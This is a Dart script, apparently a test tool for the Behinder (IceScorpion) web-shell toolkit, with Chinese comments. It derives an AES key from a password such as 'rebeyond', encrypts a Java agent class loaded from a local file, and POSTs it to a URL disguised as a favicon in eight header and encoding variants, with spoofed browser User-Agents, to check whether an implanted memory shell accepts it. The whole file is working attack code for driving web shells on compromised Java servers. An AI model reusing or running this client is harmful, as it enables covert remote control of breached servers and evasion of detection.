import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;
import 'package:http/http.dart' as http;
import 'package:crypto/crypto.dart' as crypto;

// 用法：dart tools/behinder_mem_test.dart "http://localhost:8080/favicondemo.ico" "rebeyond"

void main(List<String> args) async {
  if (args.length < 2) {
    print('Usage: dart test.dart <url> <password_or_hex_key>');
    return;
  }

  final url = args[0];
  final pass = args[1];
  print('Testing URL: $url');
  print('Testing Pass/Key: $pass');

  String aesKey;
  if (pass.length == 16 && isHex16(pass)) {
    aesKey = pass.toLowerCase();
  } else {
    aesKey = crypto.md5.convert(utf8.encode(pass)).toString().substring(0, 16);
  }
  print('Resolved AES Key: $aesKey');

  // 拿 M.class 的数据
  Uint8List agentBytes;
  try {
    final b64 = await File('data/jsp_agent_M.b64').readAsString();
    agentBytes = base64.decode(b64.trim());
    print('Loaded agent class, size: ${agentBytes.length} bytes');
  } catch (e) {
    print('Failed to load agent bytes: $e');
    return;
  }

  final key = enc.Key(Uint8List.fromList(utf8.encode(aesKey)));
  final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
  final encrypted = encrypter.encryptBytes(agentBytes);
  final encryptedBytes = encrypted.bytes;
  final encryptedBase64 = base64.encode(encryptedBytes);

  print('\n=== Test 1: Base64 Body (No Query, No Headers) ===');
  await sendTest(url, utf8.encode(encryptedBase64), {}, aesKey);

  print('\n=== Test 2: Binary Body (No Query, No Headers) ===');
  await sendTest(url, encryptedBytes, {}, aesKey);

  print('\n=== Test 3: Base64 Body + Custom Headers (Current Matrix) ===');
  await sendTest(url, utf8.encode(encryptedBase64), {
    'X-A': 'ping',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
  }, aesKey);

  print('\n=== Test 4: Base64 Body + CRLF Params (Old Matrix) ===');
  await sendTest(url, utf8.encode('$encryptedBase64\r\na=ping'), {}, aesKey);

  print('\n=== Test 5: Standard IceScorpion Header Feature ===');
  // 冰蝎有时候会在 Accept 或者 Content-Type 做文章
  await sendTest(url, utf8.encode(encryptedBase64), {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Content-Type': 'application/octet-stream',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
  }, aesKey);

  print('\n=== Test 6: Binary Body + Custom Headers ===');
  await sendTest(url, encryptedBytes, {
    'X-A': 'ping',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
  }, aesKey);

  print('\n=== Test 7: Binary Body + Query Params ===');
  await sendTest('$url?a=ping', encryptedBytes, {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
  }, aesKey);

  print('\n=== Test 8: Binary Body + Action "a" Header ===');
  await sendTest(url, encryptedBytes, {
    'a': 'ping',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
  }, aesKey);
}

  Future<void> sendTest(String url, List<int> bodyBytes, Map<String, String> extraHeaders, String aesKey) async {
  final client = http.Client();
  try {
    // 2. 发送 POST 请求
    final request = http.Request('POST', Uri.parse(url));
    request.followRedirects = false;
    request.bodyBytes = bodyBytes;
    
    final headers = {'Content-Type': 'application/octet-stream'};
    headers.addAll(extraHeaders);
    request.headers.addAll(headers);

    final response = await client.send(request);
    final responseBodyBytes = await response.stream.toBytes();
    
    print('  Status Code: ${response.statusCode}');
    print('  Headers: ${response.headers}');
    
    if (responseBodyBytes.isNotEmpty) {
      final raw = utf8.decode(responseBodyBytes, allowMalformed: true);
      print('  Body: ${raw.length > 200 ? raw.substring(0, 200) : raw}');
    } else {
      print('  Body: <empty>');
    }
  } catch (e) {
    print('  Error: $e');
  } finally {
    client.close();
  }
}

bool isHex16(String s) {
  for (var i = 0; i < 16; i++) {
    final c = s.codeUnitAt(i);
    if (!((c >= 0x30 && c <= 0x39) || (c >= 0x61 && c <= 0x66) || (c >= 0x41 && c <= 0x46))) {
      return false;
    }
  }
  return true;
}
